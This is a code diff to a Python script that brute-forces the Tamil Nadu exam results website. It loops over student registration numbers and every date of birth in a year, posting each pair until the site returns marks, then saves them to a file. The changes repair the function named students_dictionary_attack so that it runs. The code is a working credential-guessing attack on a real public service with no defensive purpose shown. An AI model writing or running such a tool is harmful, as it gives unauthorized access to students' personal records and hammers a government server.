@@ -3,31 +3,50 @@ from bs4 import BeautifulSoup
 from datetime import datetime,timedelta
 from sys import argv
 
+
 def process_package(package):
-    size = str(len(package.content)/1008)[0:4] + 'kb'
+    size = str( ( str(len(package.content)/1008)[0:4] + 'kb'))
     status = package.status_code
     content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
-    name = str( ' ' + content.splitlines()[6] +') ')
     
-    if 50>= len(content):
-        return { 'valid': False, 'content': content, 'size': size, 'status': status, 'name': name}
+    if 50> len(content):
+        return { 'validation': False, 'content': content, 'size': size, 'status': status}
     else:
-        return { 'valid': True, 'content': content, 'size': size, 'status': status, 'name': name}
+        return { 'validation': True, 'content': content, 'size': size, 'status': status}
 
 def result_screen(Details : dict):
-    id, dob, number_of_id, number_of_dates, status, size = Details['id'], Details[date_of_brith], Details['number_of_id'], Details['number_of_dates'], Details['status'], Details['size']
-    if Details['valid']:    validation = 'valid'
+    iD = Details['id']
+    dob = Details['date_of_brith']
+    count_id = Details['countered_of_id']
+    count_dates = Details['countered_of_dates']
+    status = Details['status']
+    size = Details['size']
+
+    if Details['validation']:
+        validation = 'valid'
+        name = Details['content'].splitlines()[5]
     else:   validation = 'invalid'
     
     print(f'-----' *100)
-    print(f'[req] :  {id} | {dob}  ({number_of_id}/{number_of_dates}) @!{status}  ^ ({size}kb)')
+    print(f'[req] :  {iD} | {dob}  ({count_id}/{count_dates}) @!{status}  ^ ({size}kb)')
     print(f'     ')
-    if Details['valid']:	print(f'>>> Name          : ', Details['name'])
-    print(f'>>> Student       : ', Details['id'])
-    print(f'>>> DOB           : ', Details['date_of_brith'])
+    if Details['validation']:	print(f'>>> Name          : ', name)
+    print(f'>>> Student       : ', iD)
+    print(f'>>> DOB           : ', dob)
     print(f'>>> validation    : ', validation)
-    print(f'>>> Total_count   : ', Details['total_count'])
+    print(f'>>> Total_count   : ', Details['countered_connection'])
     print(f'-----' *100)
+
+def save_result_file(Details : dict):
+
+    content = Details['content']
+    student = Details['id']
+    date = Details['date_of_brith']
+    
+    with open(f"result[{student}].txt","w") as file:
+        file.write(f" {student} || {date} "+"\n")
+        file.write(str(content) +"\n"+"\n")
+        file.close()
 
 def connection_send_package(roll_no : str , date_of_brith : str):
     url = 'https://tnresults.nic.in/wrfexrcd.asp'
@@ -53,26 +72,40 @@ def connection_send_package(roll_no : str , date_of_brith : str):
     payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}
     responce = post(url, headers=header, data=payload)
     return responce
+
+
+def students_dictionary_attack( collaction_of_rollno : list, collaction_of_date_of_brith : list):
     
+    countered_of_id = 0
+    countered_connection  = 0 
+    
+    for studentId in collaction_of_rollno:
+        countered_of_id += 1
+        countered_of_dates = len( collaction_of_date_of_brith)
+        
+        for date_of_brith in collaction_of_date_of_brith:
+            countered_of_dates -= 1
+            countered_connection += 1
+            
+            package = connection_send_package( str(studentId), str(date_of_brith))
+            result = process_package(package)
+
+            print(result)
+            Details = result.copy()
+            Details.update({'id': studentId, 'date_of_brith':date_of_brith,'countered_of_id':countered_of_id, 'countered_of_dates':countered_of_dates,'countered_connection': countered_connection})
+            result_screen(Details)
+            
+            if Details['validation']:
+                save_result_file(Details)
+                break
+
 def open_datasheet(path):
     with open(path,'r') as file:
         data=[]
         lines = file.readlines()
         for line in lines:  data.append(line.replace('\n',''))
         return data
-        
-def save_result_file(Details):
     
-    name = Details['name']
-    content = Details['content']
-    student = Details['id']
-    date = Details['date_of_brith']
-    
-    with open(f"result[{name}].txt","w") as file:
-        file.write(f" {student} || {date} "+"\n")
-        file.write(str(content) +"\n"+"\n")
-        file.close()
-        
 def leaf_year(year):
 
     if year%400 == 0:   leap = True
@@ -85,7 +118,7 @@ def render_day(year):
     date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
     data = [f"{year}-01-01"]
     
-    if leaf_year(year): #spcieal for leap year guys
+    if leaf_year(int(year)): #spcieal for leap year guys
             for d in range(365):
                 date += timedelta(days=1)
                 data.append(str(date)[0:10])
@@ -128,35 +161,11 @@ def register_no_input_manager(text):
         for id in info:
             data.append(id)
         return data
-    
-def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_brith):
-    
-    total_number_of_Id = 0
-    total_count_of_squence_over_student  = 0 
-    number_of_dates = 0
-    
-    for studentID in collaction_of_roll_no:
-        total_number_of_Id += 1
-        number_of_dates = len( collaction_of_date_of_brith)
-        
-        for date_of_brith in collaction_of_date_of_brith:
-            number_of_dates -= 1
-            total_count_of_squence_over_student += 1
-            
-            package = connection_send_package( studentID, date_of_brith)
-            result = process_package(package)
-            
-            Details = result.copy().update({'id': studentID, 'date_of_brith':date_of_brith, 'total_count': total_count_of_squence_over_student, 'number_of_dates':number_of_dates, 'number_of_id': total_number_of_Id})
-            result_screen(Details)
-            
-            if Details['valid']:
-                save_result_file(Details)
-                break
-            
+
 def get_input():
-    roll_no, date_of_brith=0,0
+    roll_no, date_of_brith = [],[]
     
-    if  len(sys.argv) >= 2:
+    if  len(argv) >= 2:
         roll_no = register_no_input_manager(argv[1])
         date_of_brith = dob_input_manager(argv[2])
     
@@ -164,13 +173,10 @@ def get_input():
         roll_no = register_no_input_manager(input("Regno -> "))
         date_of_brith = dob_input_manager(input("Dob  -> "))
         
-    return roll_no, date_of_brith
-    
-if __name__ == '__main__':
+    return list(roll_no), list(date_of_brith)
 
-    print('-----' *100)
-    print('welcome')
-    print('-----' *100, '\n')
-    
-    input = get_input
-    students_dictionary_attack(input)
+
+reg, dob = get_input()
+print(reg, dob)
+
+students_dictionary_attack(reg, dob)
